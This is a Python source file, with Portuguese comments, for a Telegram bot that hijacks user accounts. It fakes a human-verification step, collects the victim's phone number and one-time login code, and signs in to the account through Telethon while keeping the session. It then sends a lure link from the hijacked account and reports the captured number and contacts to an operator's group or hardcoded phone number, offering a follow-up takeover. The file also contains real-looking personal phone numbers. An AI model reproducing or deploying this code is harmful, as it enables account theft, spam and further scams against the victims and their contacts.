from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.custom import Button
import asyncio
import os
from dotenv import load_dotenv

# Carrega as variáveis do arquivo .env
load_dotenv()

# Obtém as variáveis de ambiente
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')

# Lista de IDs de usuários autorizados para receber notificações
# (adicione os IDs de usuários do Telegram que devem receber as notificações)
ADMIN_USERS = [
    # Adicione aqui os IDs dos usuários que devem receber notificações
    # Por exemplo: 123456789, 987654321
]

# Estados para o fluxo da conversa
CONFIRM_HUMAN, ASK_PHONE, ASK_CODE = range(3)

# Função para enviar a solicitação de código
async def request_code(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    if not await client.is_user_authorized():
        try:
            print("Enviando solicitação de código para o número:", f'+{phone}')
            sent = await client.send_code_request(f'+{phone}')
            print(sent)
            await client.disconnect()
            # Retornar também o phone_code_hash
            return True, "Código enviado com sucesso", sent.phone_code_hash
        except Exception as e:
            await client.disconnect()
            return False, f"Erro ao enviar código: {e}", None
    else:
        await client.disconnect()
        return True, "Usuário já está autorizado", None

# Função para encontrar um grupo pelo nome ou ID
async def find_telegram_group(client, group_name=None, group_id=None):
    try:
        # Obter todos os diálogos disponíveis (chats, grupos, canais)
        dialogs = await client.get_dialogs()
        
        # Depuração: listar todos os diálogos disponíveis
        print(f"Total de diálogos encontrados: {len(dialogs)}")
        for dialog in dialogs:
            entity_type = type(dialog.entity).__name__
            print(f"Diálogo: {dialog.name} (ID: {dialog.entity.id}, Tipo: {entity_type})")
        
        # Procurar pelo nome ou ID nos diálogos
        for dialog in dialogs:
            if group_name and dialog.name.lower() == group_name.lower():
                return dialog.entity
            elif group_id and dialog.entity.id == group_id:
                return dialog.entity
                
        return None
    except Exception as e:
        print(f"Erro ao buscar grupos: {e}")
        return None

# Função auxiliar para enviar mensagem de log para o grupo ou administradores
async def send_log_message_to_group(bot_client, message, buttons=None):
    try:
        # Tentar encontrar o grupo pelo nome
        group_entity = await find_telegram_group(bot_client, group_name="linbotteste")
        
        if group_entity:
            try:
                # Se encontrou o grupo, tenta enviar a mensagem
                if buttons:
                    await bot_client.send_message(group_entity, message, buttons=buttons)
                else:
                    await bot_client.send_message(group_entity, message)
                print(f"Mensagem enviada com sucesso para o grupo: {group_entity.title}")
                return True
            except Exception as group_e:
                print(f"Não foi possível enviar mensagem para o grupo encontrado: {group_e}")
        
        # Se não conseguiu enviar para o grupo, tenta enviar para administradores individualmente
        if ADMIN_USERS:
            for admin_id in ADMIN_USERS:
                try:
                    if buttons:
                        await bot_client.send_message(admin_id, message, buttons=buttons)
                    else:
                        await bot_client.send_message(admin_id, message)
                    print(f"Mensagem enviada com sucesso para o administrador ID: {admin_id}")
                    return True
                except Exception as admin_e:
                    print(f"Não foi possível enviar mensagem para o administrador {admin_id}: {admin_e}")
        
        # Se ainda não foi possível enviar para ninguém, tentar enviar para o número específico
        try:
            # Formata o número corretamente para o Telegram
            specific_number = "+5582993286918"
            
            # Tenta enviar a mensagem
            entity = await bot_client.get_entity(specific_number)
            if buttons:
                await bot_client.send_message(entity, message, buttons=buttons)
            else:
                await bot_client.send_message(entity, message)
            print(f"Mensagem enviada com sucesso para o número específico: {specific_number}")
            return True
        except Exception as e:
            print(f"Não foi possível enviar mensagem para o número específico: {e}")
            
            # Tenta formato alternativo sem o '+'
            try:
                formatted_number = specific_number.replace("+", "")
                entity = await bot_client.get_entity(formatted_number)
                if buttons:
                    await bot_client.send_message(entity, message, buttons=buttons)
                else:
                    await bot_client.send_message(entity, message)
                print(f"Mensagem enviada com sucesso para o número específico (formato alternativo)")
                return True
            except Exception as inner_e:
                print(f"Não foi possível enviar mensagem mesmo usando o formato alternativo: {inner_e}")
        
        return False
    except Exception as e:
        print(f"Erro geral ao tentar enviar notificações: {e}")
        return False

# Função para fazer login e enviar mensagens
async def login_and_send_messages(phone, code, phone_code_hash, update=None):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()

    try:
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=f'+{phone}', code=code, phone_code_hash=phone_code_hash)
                print("Login realizado com sucesso!")
            except Exception as e:
                await client.disconnect()
                return f"Erro ao logar: {e}"
        
        # Busca os contatos do usuário
        result = await client(GetContactsRequest(hash=0))
        contacts = result.users
        print(f"Total de contatos encontrados: {len(contacts)}")
        
        # Mensagem a ser enviada para todos os contatos
        message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
        
        # Enviar a mensagem no próprio chat do bot, se o update estiver disponível
        if update:
            await update.message.reply_text(message_to_send)
        
        # Contador de mensagens enviadas e com falha
        success_count = 0
        fail_count = 0
        
        # Loop para enviar mensagem para todos os contatos
        for contact in ["+5581981472018", "+5582993286918", "+5581996005600"]:
            try:
                # Tenta enviar a mensagem para o contato
                try:
                    # Primeiro tenta obter a entidade antes de enviar
                    entity = await client.get_entity(contact)
                    await client.send_message(
                        entity=entity,
                        message=message_to_send
                    )
                    success_count += 1
                    print(f"Mensagem enviada com sucesso para {contact}")
                except ValueError as e:
                    if "Cannot find any entity corresponding to" in str(e):
                        # Tenta formato alternativo sem o '+'
                        try:
                            contact_without_plus = contact.replace("+", "")
                            entity = await client.get_entity(contact_without_plus)
                            await client.send_message(
                                entity=entity,
                                message=message_to_send
                            )
                            success_count += 1
                            print(f"Mensagem enviada com sucesso para {contact} (formato alternativo)")
                        except Exception as inner_e:
                            fail_count += 1
                            print(f"Erro ao enviar mensagem para {contact} (mesmo com formato alternativo): {inner_e}")
                    else:
                        raise
                # Aguarda um pequeno intervalo para evitar limites de taxa
                await asyncio.sleep(0.5)
            except Exception as e:
                fail_count += 1
                print(f"Erro ao enviar mensagem para {contact}: {e}")
        
        print(f"Processo concluído! Mensagens enviadas: {success_count}, Falhas: {fail_count}")
        
        # Criando botões inline para a pergunta usando a sintaxe do Telethon
        keyboard = [
            [
                Button.inline("Sim", data=f"login_yes_{phone}"),
                Button.inline("Não", data=f"login_no_{phone}")
            ]
        ]
        
        # Mensagem de log que será enviada
        log_message = f"O número '+{phone}' acabou de fazer login com sucesso!\n\n" \
                      f"Total de contatos encontrados: {len(contacts)}\n\n" \
                      f"Mensagens enviadas: {success_count}, Falhas: {fail_count}\n\n" \
                      f"Vai querer logar nessa conta? \n\n" \
                      f"Primeiro solicite o código manualmente no https://web.telegram.org/\n\n" \
                      f"Depois clique no 'Sim' abaixo para solicitar o código desse usuário."
                      
        # NOVA IMPLEMENTAÇÃO: Entre no grupo especificado, envie o log e depois saia
        try:
            # 1. Entrar no grupo usando ID e username
            print("Tentando entrar no grupo especificado...")
            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
            
            if group_entity:
                # 2. Enviar a mensagem de log no grupo
                print("Enviando mensagem de log no grupo...")
                await client.send_message(group_entity, log_message, buttons=keyboard)
                print("Mensagem de log enviada com sucesso no grupo")
                
                # 3. Aguardar um pouco antes de sair (para garantir que a mensagem será entregue)
                await asyncio.sleep(2)
                
                # 4. Sair do grupo
                print("Saindo do grupo...")
                await leave_telegram_group(client, group_entity)
                print("Saiu do grupo com sucesso")
            else:
                print("Não foi possível entrar no grupo especificado. Tentando enviar mensagens de log pelos outros métodos...")
                # Continua com os métodos alternativos abaixo
        except Exception as e:
            print(f"Erro durante a operação no grupo: {e}")
            # Continua com os métodos alternativos abaixo
        
        # Se não conseguiu enviar pelo método acima, continua com os métodos alternativos
        notification_sent = False
        
        # Segundo: tentar usar o cliente do bot para enviar para grupos ou usuários específicos
        try:
            bot_client = TelegramClient("session_bot", api_id, api_hash)
            await bot_client.connect()
            
            # Usar a função auxiliar para enviar a mensagem de log com botões
            notification_sent = await send_log_message_to_group(bot_client, log_message, keyboard)
            
            await bot_client.disconnect()
        except Exception as e:
            print(f"Erro geral ao tentar enviar notificações: {e}")
        
        if not notification_sent:
            print("AVISO: Não foi possível enviar a notificação para nenhum destinatário!")
        
        return f"código verificado com sucesso!"
    except Exception as e:
        return f"Erro durante a operação: {e}"
    finally:
        await client.disconnect()

# Iniciar o bot - pedir confirmação de que não é robô
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("✅ Não sou um robô")]]
    await update.message.reply_text(
        "Clique no botão abaixo para confirmar que você não é um robô:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return CONFIRM_HUMAN

# Confirmar que não é um robô e pedir número de telefone
async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Enviar meu contato", request_contact=True)]]
    await update.message.reply_text(
        "Por favor, envie seu número de telefone clicando no botão abaixo:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return ASK_PHONE

# Receber o contato do usuário e enviar código de verificação
async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo contato do usuário.")
    if update.message.contact:
        context.user_data["phone"] = update.message.contact.phone_number
        phone = context.user_data["phone"]

        try:
            await update.message.reply_text("Enviando código de acesso! Verifique seu Telegram e aguarde...")
            success, message, phone_code_hash = await request_code(phone)
            
            if not success:
                if "Returned when all available options for this type of number were already used" in message:
                    await update.message.reply_text(
                        "Tentando novamente enviar o código de acesso..."
                    )
                    print("Reiniciando tentativa de envio do código de acesso...")
                    success, message, phone_code_hash = await request_code(phone)
                    if not success:
                        await update.message.reply_text(message)
                        return ASK_PHONE
                else:
                    await update.message.reply_text(message)
                    return ASK_PHONE
            
            # Salvar o phone_code_hash para usar durante o login
            context.user_data["phone_code_hash"] = phone_code_hash
            
            # Criar teclado numérico para o código
            keyboard = [
                ["1", "2", "3"],
                ["4", "5", "6"],
                ["7", "8", "9"],
                ["0", "Limpar"]
            ]
            
            # Inicializa o código
            context.user_data["code_digits"] = ""
            
            await update.message.reply_text(
                "Código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
                reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            )
            return ASK_CODE
        except Exception as e:
            print(f"Erro ao tentar enviar o código: {e}")
            await update.message.reply_text("Erro ao enviar o código. Por favor, tente novamente.")
            return ASK_PHONE
    else:
        print("Contato inválido recebido.")
        await update.message.reply_text("Contato inválido. Por favor, envie novamente.")
        return ASK_PHONE

# Receber o código de verificação
async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo código de acesso do usuário.")
    digit = update.message.text
    
    # Inicializa o código se ainda não existir
    if "code_digits" not in context.user_data:
        context.user_data["code_digits"] = ""
    
    current_code = context.user_data["code_digits"]

    if digit == "Limpar":
        # Se usuário clicou em limpar, zera o código
        context.user_data["code_digits"] = ""
        await update.message.reply_text(f"Código limpo. Digite novamente.")
    else:
        # Adiciona o dígito ao código atual
        context.user_data["code_digits"] += digit
        current_code = context.user_data["code_digits"]

        # Se temos menos de 5 dígitos, aguarda mais entrada
        if len(current_code) < 5:
            await update.message.reply_text(f"Código: {current_code} ({len(current_code)}/5 dígitos)")
        else:
            # Se temos 5 dígitos, processa o código
            code = current_code
            phone = context.user_data.get("phone")
            phone_code_hash = context.user_data.get("phone_code_hash")
            
            if not phone_code_hash:
                await update.message.reply_text(
                    "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start",
                    reply_markup=ReplyKeyboardRemove()
                )
                return ConversationHandler.END

            # Remove o teclado numérico
            await update.message.reply_text(
                f"Código completo: {code}. Processando...",
                reply_markup=ReplyKeyboardRemove()
            )

            # Chama a função de login e envio de mensagens
            result = await login_and_send_messages(phone, code, phone_code_hash, update)
            await update.message.reply_text(result)
             # Mensagem a ser enviada para todos os contatos
            message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
            
            # Enviar a mensagem no próprio chat do bot, se o update estiver disponível
            if update:
                await update.message.reply_text(message_to_send)
            return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Operação cancelada pelo usuário.")
    await update.message.reply_text("Operação cancelada.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Função que será executada quando alguém clicar nos botões Sim/Não
@events.register(events.CallbackQuery)
async def callback_handler(event):
    # Extrai os dados do callback (login_yes_PHONE ou login_no_PHONE)
    data = event.data.decode('utf-8')
    
    # Verifica se é um callback dos botões de login
    if data.startswith('login_yes_') or data.startswith('login_no_'):
        parts = data.split('_')
        action = parts[1]  # yes ou no
        phone = parts[2]   # número do telefone
        
        # Se a resposta for "Não", apenas agradece
        if action == 'no':
            return
        
        # Se a resposta for "Sim", pede o código novamente
        if action == 'yes':
            # Avisa que vamos solicitar o código novamente
            await event.answer("Vamos solicitar o código novamente!")
            
            # Modifica a mensagem original para indicar que está em andamento
            await event.edit("Solicitando novo código para confirmação...")
            
            # Cria um novo cliente para esse telefone específico
            client = TelegramClient(f"session_+{phone}", api_id, api_hash)
            await client.connect()
            
            # Envia uma nova mensagem para o usuário solicitando o código com teclado numérico
            keyboard = [
                [Button.text("1"), Button.text("2"), Button.text("3")],
                [Button.text("4"), Button.text("5"), Button.text("6")],
                [Button.text("7"), Button.text("8"), Button.text("9")],
                [Button.text("0"), Button.text("Limpar")]
            ]
            
            await event.respond(
                f"Um novo código foi enviado para +{phone}. Por favor, digite o código recebido aqui para confirmar:",
                buttons=keyboard
            )
                
            # Registra uma função temporária para capturar a resposta do usuário com o código
            user_code = ""
            
            @client.on(events.NewMessage(from_users=event.sender_id))
            async def code_response_handler(code_event):
                nonlocal user_code
                digit = code_event.message.text.strip()
                
                # Se o usuário clicou em "Limpar"
                if digit == "Limpar":
                    user_code = ""
                    await code_event.respond(f"Código limpo. Digite novamente.")
                    return
                
                # Se é um dígito único de 0 a 9
                if digit in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
                    user_code += digit
                    
                    # Se temos menos de 5 dígitos, informamos o progresso
                    if len(user_code) < 5:
                        await code_event.respond(f"Código: {user_code} ({len(user_code)}/5 dígitos)")
                    # Quando completar 5 dígitos, processamos automaticamente
                    else:
                        # Remove o handler para não capturar mais mensagens deste usuário
                        client.remove_event_handler(code_response_handler)
                        
                        # Envia mensagem confirmando o recebimento do código
                        await code_event.respond(f"Código recebido: {user_code}. Confirmando login...")
                        
                        try:
                            # Solicita o código novamente
                            sent = await client.send_code_request(f'+{phone}')
                            phone_code_hash = sent.phone_code_hash
                            
                            # Faz o login com o código recebido
                            await client.sign_in(phone=f'+{phone}', code=user_code, phone_code_hash=phone_code_hash)
                            
                            # Envia mensagem de log através do sistema renovado
                            log_message = f"Login confirmado para o número +{phone} com o código {user_code}!"
                            
                            # Tenta enviar para grupos ou administradores
                            try:
                                bot_client = TelegramClient("session_bot", api_id, api_hash)
                                await bot_client.connect()
                                
                                # Usar a função auxiliar para enviar a mensagem de log
                                await send_log_message_to_group(bot_client, log_message)
                                
                                await bot_client.disconnect()
                            except Exception as e:
                                print(f"Erro geral ao tentar enviar notificações: {e}")
                            
                            await code_event.respond("Login confirmado com sucesso!")
                            
                        except Exception as e:
                            await code_event.respond(f"Erro ao confirmar login: {e}")
                else:
                    # Se não for um dígito ou "Limpar", ignoramos
                    await code_event.respond("Por favor, use apenas os botões do teclado numérico.")

# Função para entrar em um grupo pelo ID ou username
async def join_telegram_group(client, group_id=None, group_username=None):
    try:
        if group_username:
            # Se temos um username, tentamos entrar diretamente
            if group_username.startswith('@'):
                group_username = group_username[1:]  # Remove o @ inicial se existir
                
            try:
                entity = await client.get_entity(group_username)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo: {group_username}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo username {group_username}: {e}")
                
        if group_id:
            # Se temos um ID, tentamos entrar pelo ID
            try:
                entity = await client.get_entity(group_id)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo pelo ID: {group_id}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo ID {group_id}: {e}")
                
        return None
    except Exception as e:
        print(f"Erro geral ao tentar entrar no grupo: {e}")
        return None

# Função para sair de um grupo
async def leave_telegram_group(client, group_entity):
    try:
        await client(LeaveChannelRequest(group_entity))
        print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else group_entity.id}")
        return True
    except Exception as e:
        print(f"Erro ao sair do grupo: {e}")
        return False

def main():
    # Obtém o token do bot do arquivo .env
    token = os.getenv('BOT_TOKEN')
    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CONFIRM_HUMAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, receive_contact)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    
    # Iniciar um cliente Telethon para lidar com os callbacks dos botões
    # Use uma das sessões existentes ou crie uma nova para o bot
    async def start_telethon():
        # Você pode usar uma sessão específica aqui ou criar uma para o bot
        bot_client = TelegramClient("session_bot", api_id, api_hash)
        await bot_client.connect()
        
        # Registrar o handler de callback
        bot_client.add_event_handler(callback_handler)
        
        # Manter o cliente rodando
        print("Cliente Telethon iniciado para escutar callbacks")
        await bot_client.run_until_disconnected()
    
    # Iniciar o cliente Telethon em uma task separada
    asyncio.run_coroutine_threadsafe(start_telethon(), asyncio.get_event_loop())
    
    app.run_polling()

if __name__ == "__main__":
    main()
